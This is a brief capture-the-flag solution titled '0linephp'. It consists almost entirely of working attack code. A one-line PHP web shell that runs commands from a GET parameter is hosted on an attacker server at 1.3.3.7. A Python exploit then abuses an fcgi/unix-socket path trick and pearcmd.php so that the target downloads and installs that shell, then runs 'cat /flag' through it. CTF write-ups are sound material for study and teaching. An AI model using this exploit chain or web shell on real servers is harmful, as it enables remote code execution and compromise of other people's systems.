# 0linephp

## Web shell

Host an simple web server that will redirect `/` to `shell.php`

index.php
```php
<?php
  header('Location: http://1.3.3.7/shell.php');
?>
```

shell.php
```php
<?='<?=system($_GET["c"]);?>'?>
```

## Exploit
```python
from urllib.request import urlopen

# challenge's host
host = 'http://target'

pearcmd = "/usr/local/lib/php/pearcmd.php?argv=+install+--installroot+/+http://1.3.3.7/" # your ip
payload = f"/index.php/unix:{'A'*5000}|fcgi://php:9000{pearcmd}"
urlopen(f"{host}{payload}")

shell = f"/tmp/pear/download/shell.php?c=cat+/flag"
payload = f"/index.php/unix:{'A'*5000}|fcgi://php:9000{shell}"
r = urlopen(f"{host}{payload}")
print(r.read())
```
